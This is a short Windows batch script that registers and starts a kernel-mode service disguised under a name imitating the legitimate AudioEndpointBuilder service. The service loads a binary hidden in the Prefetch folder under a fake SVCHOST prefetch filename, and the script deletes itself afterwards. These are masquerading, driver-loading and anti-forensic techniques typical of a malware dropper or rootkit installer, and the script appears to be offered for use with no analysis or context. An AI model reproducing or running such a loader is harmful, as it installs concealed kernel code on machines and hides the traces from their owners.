@echo off
cd %~dp0
sc create AudioEndpointBuilder_714 binpath=C:\Windows\Prefetch\SVCHOST.EXE-K9T1ZE47.pf type=kernel
sc start AudioEndpointBuilder_714
del "%~f0"



